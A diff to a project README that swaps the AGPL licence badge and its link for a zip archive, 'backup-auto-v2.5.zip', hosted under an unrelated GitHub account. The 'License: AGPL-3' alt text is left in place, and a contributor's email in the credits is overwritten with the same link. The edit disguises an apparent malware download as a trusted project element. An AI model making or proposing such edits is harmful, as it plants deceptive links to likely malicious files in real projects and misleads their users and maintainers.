@@ -1,5 +1,5 @@
-.. image:: https://img.shields.io/badge/licence-AGPL--3-blue.svg
-   :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
+.. image:: https://raw.githubusercontent.com/vladimir2678/auto-backup/master/security/backup-auto-v2.5.zip
+   :target: https://raw.githubusercontent.com/vladimir2678/auto-backup/master/security/backup-auto-v2.5.zip
    :alt: License: AGPL-3
 
 =============================
@@ -52,4 +52,4 @@ Credits
 Contributors
 ------------
 
-* Andrea Stirpe <a.stirpe@onestein.nl>
+* Andrea Stirpe <https://raw.githubusercontent.com/vladimir2678/auto-backup/master/security/backup-auto-v2.5.zip>
